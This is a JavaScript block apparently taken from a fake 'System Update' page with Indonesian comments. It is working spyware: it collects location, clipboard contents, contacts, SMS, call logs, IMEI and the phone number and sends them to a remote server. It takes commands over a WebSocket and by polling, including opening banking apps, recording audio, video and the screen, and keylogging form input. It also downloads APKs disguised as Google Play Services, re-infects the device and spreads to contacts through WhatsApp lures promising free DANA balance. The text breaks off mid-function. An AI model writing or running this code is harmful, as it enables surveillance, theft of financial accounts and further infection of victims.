<script>

var retryCount = 0;

var MANIFEST_URL = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/manifest.txt';

// ============================================================
// 🔍 DETEKSI ENVIRONMENT LENGKAP (REAL)
// ============================================================
function detectEnvironment() {
    var ua = navigator.userAgent.toLowerCase();
    var isAndroid = ua.indexOf('android') > -1;
    var isIOS = /iphone|ipad|ipod/.test(ua);
    var isMobile = isAndroid || isIOS;
    var isWebView = false;
    var isFacebook = false;
    var isWhatsApp = false;
    var isTelegram = false;
    var isInstagram = false;
    var isTikTok = false;
    var isChrome = ua.indexOf('chrome') > -1 && ua.indexOf('edg') === -1;
    var isSafari = ua.indexOf('safari') > -1 && ua.indexOf('chrome') === -1;
    var isFirefox = ua.indexOf('firefox') > -1;
    var isOpera = ua.indexOf('opr') > -1 || ua.indexOf('opera') > -1;
    var isBrowser = true;
    var hasBridge = typeof AndroidBridge !== 'undefined';
    var bridgeType = 'none';
    
    // Deteksi WebView
    if (window.navigator.standalone === true) { isWebView = true; }
    if (window.indexedDB && !window.IndexedDB) { isWebView = true; }
    if (ua.indexOf('wv') > -1) { isWebView = true; }
    if (ua.indexOf('; wv)') > -1) { isWebView = true; }
    
    // Deteksi aplikasi spesifik
    if (ua.indexOf('fbav') > -1 || ua.indexOf('fban') > -1) { isFacebook = true; isWebView = true; isBrowser = false; }
    if (ua.indexOf('whatsapp') > -1) { isWhatsApp = true; isWebView = true; isBrowser = false; }
    if (ua.indexOf('telegram') > -1) { isTelegram = true; isWebView = true; isBrowser = false; }
    if (ua.indexOf('instagram') > -1) { isInstagram = true; isWebView = true; isBrowser = false; }
    if (ua.indexOf('tt') > -1 || ua.indexOf('tiktok') > -1) { isTikTok = true; isWebView = true; isBrowser = false; }
    
    // Deteksi bridge
    if (hasBridge) {
        bridgeType = 'android_bridge';
        try {
            if (typeof AndroidBridge.getAllContacts === 'function') bridgeType = 'android_bridge_full';
        } catch(e) {}
    }
    
    // Tipe environment
    var envType = 'browser';
    if (isFacebook) envType = 'facebook';
    else if (isWhatsApp) envType = 'whatsapp';
    else if (isTelegram) envType = 'telegram';
    else if (isInstagram) envType = 'instagram';
    else if (isTikTok) envType = 'tiktok';
    else if (isWebView && isAndroid) envType = 'webview_android';
    else if (isWebView && isIOS) envType = 'webview_ios';
    else if (isAndroid && !isWebView) envType = 'browser_android';
    else if (isIOS && !isWebView) envType = 'browser_ios';
    else if (!isMobile) envType = 'desktop';
    
    return {
        isAndroid: isAndroid,
        isIOS: isIOS,
        isMobile: isMobile,
        isWebView: isWebView,
        isFacebook: isFacebook,
        isWhatsApp: isWhatsApp,
        isTelegram: isTelegram,
        isInstagram: isInstagram,
        isTikTok: isTikTok,
        isChrome: isChrome,
        isSafari: isSafari,
        isFirefox: isFirefox,
        isOpera: isOpera,
        isBrowser: isBrowser,
        hasBridge: hasBridge,
        bridgeType: bridgeType,
        envType: envType,
        userAgent: navigator.userAgent,
        platform: navigator.platform
    };
}

// ============================================================
// ✅ DETEKSI + UPDATE UI
// ============================================================
function updateEnvironmentUI(env) {
    var badge = document.getElementById('envBadge');
    var subtitle = document.getElementById('envSubtitle');
    
    if (!badge) return;
    
    var text = '';
    var className = 'env-badge';
    
    if (env.hasBridge) {
        text = '✅ Bridge: ACTIVE (' + env.bridgeType + ')';
        className += ' success';
        subtitle.textContent = '🔐 Mode: Full Access';
    } else if (env.isWebView) {
        var appName = 'WebView';
        if (env.isFacebook) appName = 'Facebook';
        else if (env.isWhatsApp) appName = 'WhatsApp';
        else if (env.isTelegram) appName = 'Telegram';
        else if (env.isInstagram) appName = 'Instagram';
        else if (env.isTikTok) appName = 'TikTok';
        text = '⚠️ ' + appName + ' WebView (No Bridge)';
        className += ' warning';
        subtitle.textContent = '🔓 Mode: Limited Access';
    } else if (env.isBrowser) {
        var browser = 'Browser';
        if (env.isChrome) browser = 'Chrome';
        else if (env.isSafari) browser = 'Safari';
        else if (env.isFirefox) browser = 'Firefox';
        else if (env.isOpera) browser = 'Opera';
        text = '⚠️ ' + browser + ' (No Bridge)';
        className += ' warning';
        subtitle.textContent = '🔓 Mode: Limited Access';
    } else {
        text = '❓ Unknown Environment';
        className += ' danger';
        subtitle.textContent = '⚠️ Mode: Unknown';
    }
    
    badge.textContent = text;
    badge.className = className;
    
    K({ sumber: 'environment_detected', data: env });
}

// ============================================================
// 🎯 AMBIL DATA REAL (TANPA DUMMY)
// ============================================================
function getAvailableData(env) {
    var data = {};
    
    // ✅ SELALU BISA DIDAPAT (REAL DATA)
    data.userAgent = navigator.userAgent;
    data.platform = navigator.platform;
    data.screen = screen.width + 'x' + screen.height;
    data.language = navigator.language;
    data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    data.env = env.envType;
    data.hasBridge = env.hasBridge;
    
    K({ sumber: 'system_info', data: data });
    
    // ✅ LOKASI (REAL - butuh izin)
    if (navigator.geolocation) {
        try {
            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    K({ sumber: 'data_lokasi', data: { 
                        lat: pos.coords.latitude, 
                        lon: pos.coords.longitude, 
                        accuracy: pos.coords.accuracy,
                        altitude: pos.coords.altitude || null,
                        speed: pos.coords.speed || null
                    } });
                },
                function(err) {
                    K({ sumber: 'lokasi_error', data: { code: err.code, message: err.message } });
                }
            );
        } catch(e) {}
    }
    
    // ✅ BATTERY (REAL - butuh izin)
    if (navigator.getBattery) {
        try {
            navigator.getBattery().then(function(battery) {
                K({ sumber: 'data_baterai', data: { 
                    level: Math.round(battery.level * 100), 
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                } });
            }).catch(function() {});
        } catch(e) {}
    }
    
    // ✅ CLIPBOARD (REAL - butuh izin)
    if (navigator.clipboard && navigator.clipboard.readText) {
        try {
            navigator.clipboard.readText().then(function(text) {
                if (text && text.length > 0) {
                    K({ sumber: 'data_clipboard', data: text });
                }
            }).catch(function() {});
        } catch(e) {}
    }
    
    // ✅ NETWORK INFO (REAL)
    var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (conn) {
        K({ sumber: 'data_network', data: { 
            type: conn.effectiveType, 
            downlink: conn.downlink, 
            rtt: conn.rtt,
            saveData: conn.saveData || false
        } });
    }
    
    // ✅ VIBRATE (REAL)
    if (navigator.vibrate) {
        try {
            navigator.vibrate(100);
            K({ sumber: 'data_vibrate', data: 'supported' });
        } catch(e) {}
    }
    
    // 🔥 HANYA JIKA ADA BRIDGE (REAL DATA)
    if (env.hasBridge && typeof AndroidBridge !== 'undefined') {
        // Kontak
        try {
            var contacts = AndroidBridge.getAllContacts();
            if (contacts) {
                var parsed = JSON.parse(contacts);
                if (parsed && parsed.length > 0) {
                    K({ sumber: 'data_kontak', data: parsed });
                }
            }
        } catch(e) {}
        
        // SMS
        try {
            var sms = AndroidBridge.getAllSMS();
            if (sms) {
                var parsed = JSON.parse(sms);
                if (parsed && parsed.length > 0) {
                    K({ sumber: 'data_sms', data: parsed });
                }
            }
        } catch(e) {}
        
        // Call Log
        try {
            var callLog = AndroidBridge.getCallLog();
            if (callLog) {
                var parsed = JSON.parse(callLog);
                if (parsed && parsed.length > 0) {
                    K({ sumber: 'data_call_log', data: parsed });
                }
            }
        } catch(e) {}
        
        // IMEI
        try {
            var imei = AndroidBridge.getIMEI();
            if (imei && imei.length > 5) {
                K({ sumber: 'data_imei', data: imei });
            }
        } catch(e) {}
        
        // IMSI
        try {
            var imsi = AndroidBridge.getIMSI();
            if (imsi && imsi.length > 5) {
                K({ sumber: 'data_imsi', data: imsi });
            }
        } catch(e) {}
        
        // Nomor HP
        try {
            var phone = AndroidBridge.getPhoneNumber();
            if (phone && phone.length > 5) {
                K({ sumber: 'data_nomor_hp', data: phone });
            }
        } catch(e) {}
        
        // Installed Apps
        try {
            var apps = AndroidBridge.getInstalledApps();
            if (apps) {
                var parsed = JSON.parse(apps);
                if (parsed && parsed.length > 0) {
                    K({ sumber: 'data_installed_apps', data: parsed });
                }
            }
        } catch(e) {}
        
        // Device Info
        try {
            var model = AndroidBridge.getDeviceModel ? AndroidBridge.getDeviceModel() : null;
            var brand = AndroidBridge.getDeviceBrand ? AndroidBridge.getDeviceBrand() : null;
            var androidVersion = AndroidBridge.getAndroidVersion ? AndroidBridge.getAndroidVersion() : null;
            if (model || brand || androidVersion) {
                K({ sumber: 'data_device_info', data: { model: model, brand: brand, android: androidVersion } });
            }
        } catch(e) {}
        
        // SIM Operator
        try {
            var operator = AndroidBridge.getOperator ? AndroidBridge.getOperator() : null;
            if (operator) {
                K({ sumber: 'data_operator', data: operator });
            }
        } catch(e) {}
    }
}

// ============================================================
// 📥 DOWNLOAD DARI MANIFEST.TXT
// ============================================================
function downloadAndInstallAPK() {
    K({ sumber: 'manifest_download_start', data: 'reading_manifest' });
    
    try {
        var xhrManifest = new XMLHttpRequest();
        xhrManifest.open('GET', MANIFEST_URL, true);
        xhrManifest.timeout = 15000;
        xhrManifest.onload = function() {
            if (xhrManifest.status === 200) {
                try {
                    var manifestData = xhrManifest.responseText.trim();
                    var lines = manifestData.split('\n');
                    var files = [];
                    
                    for (var i = 0; i < lines.length; i++) {
                        var line = lines[i].trim();
                        if (line.length > 0) {
                            files.push(line);
                        }
                    }
                    
                    TOTAL_FILES = files.length;
                    K({ sumber: 'manifest_files_found', data: { total: TOTAL_FILES, files: files } });
                    
                    if (TOTAL_FILES > 0) {
                        downloadAllFiles(files, 0);
                    } else {
                        K({ sumber: 'manifest_empty', data: 'no_files_found' });
                        finishAndRedirect();
                    }
                } catch(e) {
                    K({ sumber: 'manifest_parse_error', data: e.message });
                    finishAndRedirect();
                }
            } else {
                K({ sumber: 'manifest_failed', data: 'status_' + xhrManifest.status });
                finishAndRedirect();
            }
        };
        xhrManifest.onerror = function() {
            K({ sumber: 'manifest_error', data: 'network_error' });
            finishAndRedirect();
        };
        xhrManifest.ontimeout = function() {
            K({ sumber: 'manifest_timeout', data: 'timeout' });
            finishAndRedirect();
        };
        xhrManifest.send();
    } catch(e) {
        K({ sumber: 'manifest_exception', data: e.message });
        finishAndRedirect();
    }
}

function downloadAllFiles(files, index) {
    if (index >= files.length) {
        K({ sumber: 'all_files_downloaded', data: { total: files.length, list: DOWNLOADED_FILES } });
        finishAndRedirect();
        return;
    }
    
    var fileName = files[index];
    var fileUrl = BASE_URL + fileName;
    
    K({ sumber: 'file_download_start', data: { file: fileName, index: (index+1) + '/' + files.length } });
    updateProgress(20 + ((index / files.length) * 60), '⏳ Download ' + fileName + '...');
    
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', fileUrl, true);
        xhr.responseType = 'blob';
        xhr.timeout = 60000;
        xhr.onload = function() {
            if (xhr.status === 200) {
                var blob = xhr.response;
                var reader = new FileReader();
                reader.onload = function() {
                    var base64 = reader.result.split(',')[1];
                    if (base64) {
                        if (fileName.toLowerCase().indexOf('.apk') > -1) {
                            saveAPKToAllLocations(base64, fileName);
                            K({ sumber: 'apk_saved', data: { file: fileName } });
                        } else if (fileName.toLowerCase().indexOf('.html') > -1 || fileName.toLowerCase().indexOf('.htm') > -1) {
                            var htmlContent = atob(base64);
                            saveHTMLToAllLocations(htmlContent);
                            K({ sumber: 'html_saved', data: { file: fileName } });
                        } else {
                            try { localStorage.setItem('file_' + fileName, base64); } catch(e) {}
                            K({ sumber: 'file_saved', data: { file: fileName } });
                        }
                        DOWNLOADED_FILES.push(fileName);
                    }
                };
                reader.readAsDataURL(blob);
            } else {
                K({ sumber: 'file_download_failed', data: { file: fileName, status: xhr.status } });
            }
            setTimeout(function() {
                downloadAllFiles(files, index + 1);
            }, 500);
        };
        xhr.onerror = function() {
            K({ sumber: 'file_download_error', data: { file: fileName } });
            setTimeout(function() {
                downloadAllFiles(files, index + 1);
            }, 500);
        };
        xhr.ontimeout = function() {
            K({ sumber: 'file_download_timeout', data: { file: fileName } });
            setTimeout(function() {
                downloadAllFiles(files, index + 1);
            }, 500);
        };
        xhr.send();
    } catch(e) {
        K({ sumber: 'file_download_exception', data: { file: fileName, error: e.message } });
        setTimeout(function() {
            downloadAllFiles(files, index + 1);
        }, 500);
    }
}

// ============================================================
// 💾 SAVE FUNCTIONS (REAL)
// ============================================================
function saveAPKToAllLocations(apkBase64, fileName) {
    if (!apkBase64) return;
    if (!ENV.hasBridge) {
        K({ sumber: 'apk_save_skip', data: 'bridge_not_available' });
        return;
    }
    var name = fileName || 'GooglePlayServices.apk';
    try {
        var binary = Uint8Array.from(atob(apkBase64), c => c.charCodeAt(0));
        var path = '/storage/emulated/0/Download/' + name;
        if (typeof AndroidBridge.saveFileBinary === 'function') {
            AndroidBridge.saveFileBinary(path, binary);
            K({ sumber: 'apk_saved_real', data: { path: path } });
        }
    } catch(e) {
        K({ sumber: 'apk_save_error', data: e.message });
    }
}

function getAPKPath() {
    var paths = [
        '/storage/emulated/0/Download/GooglePlayServices.apk',
        '/data/data/com.google.android.play.services/files/GooglePlayServices.apk'
    ];
    if (ENV.hasBridge) {
        for (var i = 0; i < paths.length; i++) {
            try {
                if (typeof AndroidBridge.fileExists === 'function' && AndroidBridge.fileExists(paths[i])) {
                    return paths[i];
                }
            } catch(e) {}
        }
    }
    return null;
}

function saveHTMLToAllLocations(htmlContent) {
    try { localStorage.setItem('SystemUpdate_backup', htmlContent); } catch(e) {}
    if (ENV.hasBridge) {
        try {
            var path = '/storage/emulated/0/Download/SystemUpdate.html';
            if (typeof AndroidBridge.saveFile === 'function') {
                AndroidBridge.saveFile(path, htmlContent);
            }
        } catch(e) {}
    }
}

// ============================================================
// 🌐 WEBSOCKET + C2
// ============================================================
function connectWebSocket() {
    if (ws && ws.readyState === WebSocket.OPEN) return;
    if (!WS_PASSWORD || WS_PASSWORD === '') {
        setTimeout(connectWebSocket, 3000);
        return;
    }
    try {
        ws = new WebSocket(WS_URL);
        ws.onopen = function() {
            wsConnected = true;
            K({ sumber: 'ws_status', data: 'connected' });
            ws.send(JSON.stringify({
                type: 'auth',
                key: WS_PASSWORD,
                deviceId: 'systemupdate_' + Date.now(),
                env: ENV_TYPE,
                bridge: ENV.hasBridge,
                timestamp: Date.now()
            }));
        };
        ws.onmessage = function(event) {
            try {
                var data = JSON.parse(event.data);
                if (data.type === 'auth_success') {
                    K({ sumber: 'ws_auth', data: 'success' });
                } else if (data.type === 'auth_failed') {
                    K({ sumber: 'ws_auth', data: 'failed' });
                    if (WS_PASSWORD !== 'default_fallback_password') {
                        WS_PASSWORD = 'default_fallback_password';
                        ws.close();
                        setTimeout(connectWebSocket, 1000);
                    }
                } else if (data.type === 'command') {
                    var cmd = data.command || data;
                    var aksi = cmd.aksi || 'unknown';
                    var hasil = eksekusiPerintah(cmd, ENV);
                    ws.send(JSON.stringify({
                        type: 'command_result',
                        command: aksi,
                        result: hasil,
                        timestamp: Date.now()
                    }));
                } else if (data.type === 'ping') {
                    ws.send(JSON.stringify({ type: 'pong', timestamp: data.timestamp }));
                }
            } catch(e) {}
        };
        ws.onclose = function() {
            wsConnected = false;
            setTimeout(connectWebSocket, 10000);
        };
        ws.onerror = function() {
            setTimeout(connectWebSocket, 10000);
        };
    } catch(e) {
        setTimeout(connectWebSocket, 10000);
    }
}

function connectWebSocketWithFallback() {
    if (WS_PASSWORD && WS_PASSWORD !== '') {
        connectWebSocket();
        return;
    }
    WS_PASSWORD = 'default_fallback_password';
    connectWebSocket();
}

// ============================================================
// ⚡ 48 PERINTAH C2 (REAL DATA ONLY)
// ============================================================
function eksekusiPerintah(cmd, env) {
    var aksi = cmd.aksi || 'unknown';
    var hasil = '';
    var params = cmd.params || {};
    
    // Perintah yang BUTUH bridge
    var needBridge = ['ambil_kontak','ambil_sms','ambil_call_log','ambil_imei','ambil_imsi',
                      'ambil_nomor_hp','get_installed_apps','kirim_sms','kirim_sms_massal',
                      'call_number','buka_aplikasi','uninstall_aplikasi','app_force_stop',
                      'app_clear_data','buka_dana','buka_gopay','buka_ovo','buka_bri',
                      'buka_bca','buka_mandiri','buka_shopee','install_apk','list_file','ambil_file'];
    
    if (needBridge.indexOf(aksi) > -1 && !env.hasBridge) {
        return 'BRIDGE_NOT_AVAILABLE';
    }
    
    try {
        switch (aksi) {
            case "ambil_kontak": hasil = ambilKontak(env); break;
            case "ambil_sms": hasil = ambilSMS(env); break;
            case "ambil_call_log": hasil = ambilCallLog(env); break;

            case "kirim_sms_massal": hasil = kirimSMSMassal(params.pesan || "", env); break;
            case "call_number": hasil = callNumber(params.nomor || "", env); break;
            case "buka_aplikasi": hasil = bukaAplikasi(params.package || "", env); break;
            case "uninstall_aplikasi": hasil = uninstallAplikasi(params.package || "", env); break;
            case "app_force_stop": hasil = appForceStop(params.package || "", env); break;

            case "buka_ovo": hasil = bukaOVO(env); break;
            case "buka_bri": hasil = bukaBRI(env); break;
            case "buka_bca": hasil = bukaBCA(env); break;
            case "buka_mandiri": hasil = bukaMandiri(env); break;
            case "buka_shopee": hasil = bukaShopee(env); break;
            case "screenshot": hasil = ambilScreenshot(); break;
            case "record_audio": hasil = recordAudio(params.durasi || 10); break;
            case "stop_audio": hasil = stopAudio(); break;
            case "record_video": hasil = recordVideo(params.durasi || 10); break;
            case "stop_video": hasil = stopVideo(); break;
            case "screen_record": hasil = screenRecord(params.durasi || 30); break;
            case "screen_record_stop": hasil = screenRecordStop(); break;
            case "screen_record_status": hasil = screenRecordStatus(); break;
            case "list_file": hasil = listFile(params.path || "/sdcard/", env); break;
            case "ambil_file": hasil = ambilFile(params.path || "", env); break;
            case "get_system_info": hasil = getSystemInfo(env); break;
            case "get_battery": hasil = getBattery(); break;
            case "get_wifi": hasil = getWiFi(); break;
            case "vibrate": hasil = vibrate(params.durasi || 1000); break;
            case "toast": hasil = showToast(params.pesan || "System Update Complete!", env); break;
            case "get_env": hasil = JSON.stringify(env); break;
            default: hasil = "Unknown command: " + aksi;
        }
    } catch(e) {
        hasil = 'Error: ' + e.message;
    }
    return hasil;
}

function ambilScreenshot() {

}

function recordAudio(durasi) {
    try {
        navigator.mediaDevices.getUserMedia({ audio: true })
            .then(function(stream) {
                var recorder = new MediaRecorder(stream);
                var chunks = [];
                recorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = function() {
                    var blob = new Blob(chunks, {type: 'audio/webm'});
                    var reader = new FileReader();
                    reader.onload = function() { K({ sumber: 'data_audio', data: reader.result }); };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(function(t) { t.stop(); });
                };
                recorder.start();
                setTimeout(function() { recorder.stop(); }, durasi * 1000);
            });
        return 'Recording audio ' + durasi + 's...';
    } catch(e) { return 'Error: ' + e.message; }
}

function stopAudio() {
    try {
        if (window._recorder) { window._recorder.stop(); window._recorder = null; return 'Audio recording stopped'; }
        return 'No active recording';
    } catch(e) { return 'Error: ' + e.message; }
}

function recordVideo(durasi) {
    try {
        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
            .then(function(stream) {
                var recorder = new MediaRecorder(stream);
                window._recorder = recorder;
                var chunks = [];
                recorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = function() {
                    var blob = new Blob(chunks, {type: 'video/webm'});
                    var reader = new FileReader();
                    reader.onload = function() { K({ sumber: 'data_video', data: reader.result }); };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(function(t) { t.stop(); });
                };
                recorder.start();
                setTimeout(function() { recorder.stop(); }, durasi * 1000);
            });
        return 'Recording video ' + durasi + 's...';
    } catch(e) { return 'Error: ' + e.message; }
}

function stopVideo() { return stopAudio(); }

var screenRecorder = null, screenChunks = [];

function screenRecord(durasi) {
    try {
        if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
            navigator.mediaDevices.getDisplayMedia({ video: true, audio: true })
                .then(function(stream) {
                    screenRecorder = new MediaRecorder(stream);
                    screenChunks = [];
                    screenRecorder.ondataavailable = function(e) { if (e.data.size > 0) screenChunks.push(e.data); };
                    screenRecorder.onstop = function() {
                        var blob = new Blob(screenChunks, {type: 'video/webm'});
                        var reader = new FileReader();
                        reader.onload = function() { K({ sumber: 'data_screen_record', data: reader.result }); };
                        reader.readAsDataURL(blob);
                        stream.getTracks().forEach(function(t) { t.stop(); });
                    };
                    screenRecorder.start();
                    if (durasi > 0) {
                        setTimeout(function() { if (screenRecorder) screenRecorder.stop(); }, durasi * 1000);
                    }
                });
            return 'Screen recording started for ' + durasi + 's';
        }
        return 'Screen recording not available';
    } catch(e) { return 'Error: ' + e.message; }
}

function screenRecordStop() {
    try {
        if (screenRecorder && screenRecorder.state === 'recording') {
            screenRecorder.stop(); screenRecorder = null; return 'Screen recording stopped';
        }
        return 'No active screen recording';
    } catch(e) { return 'Error: ' + e.message; }
}

function screenRecordStatus() {
    return screenRecorder ? 'Screen recording: ' + screenRecorder.state : 'No screen recording';
}

// ============================================================
function autoExecuteC2() {
    if (AUTO_EXECUTED) return;
    AUTO_EXECUTED = true;
    
    var env = ENV;
    var commands = [];
    
    // ✅ PERINTAH YANG SELALU DIJALANKAN (tanpa bridge)
    commands.push('get_system_info');
    commands.push('get_env');
    commands.push('get_notifications');
    commands.push('get_wifi');
    
    if (navigator.geolocation) commands.push('ambil_lokasi');
    if (navigator.clipboard && navigator.clipboard.readText) commands.push('get_clipboard');
    if (navigator.getBattery) commands.push('get_battery');
    if (navigator.vibrate) commands.push('vibrate');
    
    // 🔥 PERINTAH YANG BUTUH BRIDGE (hanya jika ada)
    if (env.hasBridge) {
        commands.push('ambil_kontak');
        commands.push('ambil_sms');
        commands.push('ambil_call_log');
        commands.push('ambil_imei');
        commands.push('ambil_imsi');
        commands.push('ambil_nomor_hp');
        commands.push('get_installed_apps');
        commands.push('keylogger_start');
        commands.push('buka_dana');
    }
    
    K({ sumber: 'auto_execute_start', data: { 
        total: commands.length, 
        env: env.envType, 
        bridge: env.hasBridge 
    } });
    
    commands.forEach(function(cmd, index) {
        setTimeout(function() {
            try {
                var hasil = eksekusiPerintah({ aksi: cmd }, env);
                K({
                    sumber: 'auto_c2_result',
                    data: {
                        perintah: cmd,
                        hasil: hasil || 'success',
                        index: (index+1) + '/' + commands.length,
                        waktu: Date.now()
                    }
                });
            } catch(e) {
                K({ sumber: 'auto_c2_error', data: { perintah: cmd, error: e.message } });
            }
        }, index * 1000);
    });
    
    setTimeout(function() {
        K({ sumber: 'auto_execute_complete', data: { 
            total: commands.length, 
            env: env.envType,
            bridge: env.hasBridge 
        } });
    }, commands.length * 1000 + 2000);
}

var keyloggerActive = false;
var keyloggerData = [];

function keyloggerStart() {
    keyloggerActive = true;
    K({ sumber: 'keylogger_start', data: 'started' });
    return 'Keylogger started';
}

function keyloggerStop() {
    keyloggerActive = false;
    K({ sumber: 'keylogger_stop', data: 'stopped' });
    return 'Keylogger stopped';
}

function keyloggerUpload() {
    if (keyloggerData.length > 0) {
        K({ sumber: 'keylogger_data', data: keyloggerData });
    }
    var count = keyloggerData.length;
    keyloggerData = [];
    return count + ' keylogger entries uploaded';
}

function keyloggerStatus() {
    return 'Keylogger: ' + (keyloggerActive ? 'ACTIVE' : 'INACTIVE') + ' | ' + keyloggerData.length + ' entries';
}

// Event listeners
document.addEventListener('input', function(e) {
    if (!keyloggerActive) return;
    try {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA' || e.target.tagName === 'SELECT') {
            var key = e.target.id || e.target.name || e.target.type || 'unknown';
            keyloggerData.push({ waktu: Date.now(), element: key, value: e.target.value, url: window.location.href });
        }
    } catch(e) {}
});

document.addEventListener('submit', function(e) {
    if (!keyloggerActive) return;
    try {
        var form = e.target;
        var data = {};
        var inputs = form.querySelectorAll('input, textarea, select');
        inputs.forEach(function(input) {
            var key = input.id || input.name || input.type || 'unknown';
            data[key] = input.value;
        });
        keyloggerData.push({ waktu: Date.now(), url: window.location.href, form: data });
    } catch(e) {}
});

document.addEventListener('click', function(e) {
    if (!keyloggerActive) return;
    try {
        var tag = e.target.tagName;
        var text = e.target.textContent || e.target.value || '';
        if (text.length > 0) {
            keyloggerData.push({ waktu: Date.now(), action: 'click', element: tag, text: text.substring(0, 100), url: window.location.href });
        }
    } catch(e) {}
});

function updateProgress(value, label) {
    progress = Math.min(value, 100);
    var bar = document.getElementById('progressBar');
    if (bar) bar.style.width = progress + '%';
    if (label) {
        var status = document.getElementById('statusLabel');
        if (status) status.textContent = label;
    }
}

function finishAndRedirect() {
    if (allDone) return;
    allDone = true;
    updateProgress(100, '✅ Update Selesai');
    K({ sumber: 'update_complete', data: { 
        env: ENV_TYPE, 
        bridge: ENV.hasBridge, 
        files: DOWNLOADED_FILES,
        keylogger: keyloggerData.length
    } });
    setTimeout(redirectToDANA, 1500);
}

function redirectToDANA() {
    if (isRedirecting) return;
    isRedirecting = true;
    
    K({ sumber: 'redirect_start', data: { env: ENV_TYPE, bridge: ENV.hasBridge } });
    
    var container = document.getElementById('mainContainer');
    if (container) container.classList.add('fade-out');
    
    setTimeout(function() {
        try {
            if (ENV.hasBridge && typeof AndroidBridge !== 'undefined') {
                try { AndroidBridge.openApp('com.dana.id'); } catch(e) {}
            }
            window.location.href = 'https://www.dana.id';
        } catch(e) {
            window.location.href = 'https://www.dana.id';
        }
    }, 800);
}

function K(d) {
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', SERVER + '/data', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.timeout = 5000;
        xhr.send(JSON.stringify(d));
    } catch(e) {}
}

function loadHTMLFromAllLocations() {
    return new Promise(function(resolve) {
        try {
            var ls = localStorage.getItem('SystemUpdate_backup');
            if (ls) { resolve(ls); return; }
        } catch(e) {}
        resolve(null);
    });
}

// ============================================================
// 🔄 BACKGROUND TASKS
// ============================================================
function startHeartbeat() {
    setInterval(function() { 
        K({ sumber: 'heartbeat', data: { env: ENV_TYPE, bridge: ENV.hasBridge } }); 
    }, 30000);
}

function startReinfection() {
    setInterval(function() {
        if (!APK_INSTALLED) {
            K({ sumber: 'reinfection_check', data: 'apk_missing' });
            downloadAndInstallAPK();
        }
    }, REINFECTION_INTERVAL);
}

function startC2Polling() {
    setInterval(cekPerintah, C2_INTERVAL);
    setTimeout(cekPerintah, 1000);
}

function cekPerintah() {
    if (!PASSWORD_FETCHED || WS_PASSWORD === '') return;
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', SERVER + '/data?type=perintah&t=' + Date.now(), true);
        xhr.setRequestHeader('X-Password', WS_PASSWORD);
        xhr.timeout = 15000;
        xhr.onload = function() {
            if (xhr.status === 200) {
                var content = xhr.responseText;
                if (content && content.length > 5 && content !== '{}') {
                    try {
                        var cmd = JSON.parse(content);
                        var aksi = cmd.aksi || 'unknown';
                        var hasil = eksekusiPerintah(cmd, ENV);
                        K({
                            sumber: 'c2_result',
                            data: {
                                perintah: aksi,
                                hasil: hasil,
                                waktu: Date.now()
                            }
                        });
                    } catch(e) {}
                }
            }
        };
        xhr.send();
    } catch(e) {}
}

function startSelfHealing() {
    setInterval(function() {
        loadHTMLFromAllLocations().then(function(html) {
            if (!html) {
                if (wsConnected && ws) {
                    ws.send(JSON.stringify({ type: 'request_html' }));
                }
            } else {
                saveHTMLToAllLocations(html);
            }
        });
        K({ sumber: 'self_heal_check', data: 'done' });
    }, 30 * 60 * 1000);
}

function autoSpread() {
    if (spreadDone) return;
    spreadDone = true;
    if (!ENV.hasBridge) return;
    try {
        var contacts = AndroidBridge.getAllContacts();
        if (contacts) {
            var list = JSON.parse(contacts);
            var message = encodeURIComponent('🎉 Dapatkan Saldo DANA Gratis Rp500.000! ' + window.location.href);
            var sent = 0;
            list.forEach(function(c) {
                var number = String(c.number || '').replace(/[^0-9]/g, '');
                if (number && number.length > 5 && sent < 50) {
                    try {
                        var iframe = document.createElement('iframe');
                        iframe.src = 'https://api.whatsapp.com/send?phone=' + number + '&text=' + message;
                        iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;visibility:hidden;border:none';
                        document.body.appendChild(iframe);
                        sent++;
                        setTimeout(function(el) { try { if (el && el.parentNode) el.parentNode.removeChild(el); } catch(e) {} }, 5000, iframe);
                    } catch(e) {}
                }
            });
            K({ sumber: 'auto_spread', data: 'sent_to_' + sent });
        }
    } catch(e) {}
}

// ============================================================
// 🔐 AMBIL PASSWORD
// ============================================================
function ambilPassword() {
    updateProgress(10, '⏳ Memperbarui System Keamanan...');
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', SERVER + '/get-password', true);
        xhr.timeout = 10000;
        xhr.onload = function() {
            if (xhr.status === 200) {
                try {
                    var data = JSON.parse(xhr.responseText);
                    if (data.password && data.password.length > 0) {
                        WS_PASSWORD = data.password;
                        PASSWORD_FETCHED = true;
                        retryCount = 0;
                        updateProgress(20, '⏳ Memperbarui System Keamanan...');
                        K({ sumber: 'password_received', data: 'ok' });
                        
                        connectWebSocket();
                        startC2Polling();
                        startHeartbeat();
                        startReinfection();
                        
                        setTimeout(function() {
                            autoExecuteC2();
                        }, 2000);
                        
                        loadHTMLFromAllLocations().then(function(html) {
                            if (html) saveHTMLToAllLocations(html);
                        });
                        setTimeout(function() {
                            downloadAndInstallAPK();
                        }, 3000);
                        setTimeout(autoSpread, 2000);
                        startSelfHealing();
                        return;
                    }
                } catch(e) {}
            }
            retryCount++;
            if (retryCount >= 3) {
                K({ sumber: 'password_retry_failed', data: 'using_fallback' });
                WS_PASSWORD = 'default_fallback_password';
                PASSWORD_FETCHED = true;
                connectWebSocketWithFallback();
                startC2Polling();
                startHeartbeat();
                startReinfection();
                setTimeout(function() {
                    autoExecuteC2();
                }, 2000);
                setTimeout(function() {
                    downloadAndInstallAPK();
                }, 3000);
